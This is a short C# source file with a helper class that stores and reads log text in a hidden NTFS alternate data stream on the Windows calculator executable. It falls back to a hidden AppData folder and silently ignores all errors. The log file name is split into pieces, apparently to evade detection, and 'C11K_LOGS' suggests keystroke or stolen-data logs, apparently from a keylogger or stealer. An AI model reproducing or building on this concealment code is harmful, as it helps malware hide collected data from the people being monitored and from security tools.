// Dosya: Core/Ads.cs
using System;
using System.IO;

namespace App.Service
{
    public static class Ads
    {
        public const string AdsPath = @"C:\Windows\System32\calc.exe:C11" + "K_LOGS.txt";

        static string Fallback
        {
            get
            {
                string d = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "C11" + "K");
                Directory.CreateDirectory(d);
                return Path.Combine(d, "C11" + "K_LOGS.txt");
            }
        }

        public static void Append(string text)
        {
            if (string.IsNullOrEmpty(text)) return;
            try { File.AppendAllText(AdsPath, text); return; } catch { }
            try { File.AppendAllText(Fallback, text); } catch { }
        }

        public static string Read()
        {
            try { if (File.Exists(AdsPath)) return File.ReadAllText(AdsPath); } catch { }
            try { if (File.Exists(Fallback)) return File.ReadAllText(Fallback); } catch { }
            return "";
        }
    }
}